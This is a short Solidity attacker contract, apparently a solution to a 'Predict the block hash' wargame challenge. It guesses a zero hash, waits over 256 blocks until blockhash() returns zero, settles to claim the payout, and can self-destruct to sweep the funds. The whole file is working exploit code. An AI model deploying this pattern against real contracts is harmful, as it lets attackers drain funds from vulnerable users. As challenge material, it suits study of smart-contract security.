// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

interface ABI {
    function lockInGuess(bytes32) external payable;
    function settle() external;
}

/**
 * @title PredictTheBlockhash
 * @dev Since the 'blockhash()' function only works for the 256 most recent block, we juste have to wait until 256 blocks passes after our guess and the answer will be 0.
 */
contract PredictTheBlockhash {
    uint256 blockcount;

    function sendGuess(address _contract) public {
        ABI(_contract).lockInGuess.value(1 ether)(bytes32(0));
        blockcount = block.number;
    }

    function settle(address _contract) public {
        require(block.number - blockcount > 256);
        ABI(_contract).settle();
    }

    function sweep(address _to) public {
        selfdestruct(_to);
    }

    function PredictTheBlockhash() public payable {}
    function () payable public {}
}